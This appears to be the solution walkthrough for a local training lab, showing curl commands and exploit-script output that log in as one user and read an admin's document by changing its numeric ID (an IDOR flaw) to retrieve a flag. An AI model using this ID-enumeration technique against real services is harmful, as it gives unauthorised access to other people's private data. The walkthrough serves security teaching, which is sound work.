# Walkthrough

This is the full solution. Try the lab yourself first.

## Setup

```bash
docker compose up --build -d
```

The first build takes about 30 seconds. Subsequent starts use the cached image and are instant.

## Step 1: Login as alice

```bash
curl -s -X POST http://localhost:8080/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"password123"}'
```

```json
{"token": "3f8a...", "user": "alice"}
```

## Step 2: List alice's documents

```bash
TOKEN="3f8a..."
curl -s -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/documents
```

```json
{
  "documents": [
    {"id": 1, "owner_id": 1, "owner": "alice", "title": "Q3 Expense Report", "content": "Travel: $420. Meals: $85. Total: $505."}
  ],
  "note": "Your documents only"
}
```

Alice's document has ID 1. Try the next integer.

## Step 3: Read document 2 via IDOR

```bash
curl -s -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/documents/2
```

```json
{
  "document": {
    "id": 2,
    "owner_id": 2,
    "owner": "admin",
    "title": "System Credentials",
    "content": "POC{a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4}"
  }
}
```

## Alternative: use the exploit script

```bash
python3 exploit/exploit.py http://localhost:8080
```

```
[*] Target: http://localhost:8080

[*] Step 1: logging in as alice...
    Token: 3f8a...

[*] Step 2: listing alice's documents...
    Doc 1: Q3 Expense Report

[*] Step 3: enumerating document IDs...
    Doc 1 (owner: alice): Travel: $420. Meals: $85. Total: $505.
    Doc 2 (owner: admin): POC{a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4}

[+] IDOR: alice read admin's document.
[+] Flag: POC{a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4}
```

Flags are random per container start. The values above are examples.

## Teardown

```bash
docker compose down
```
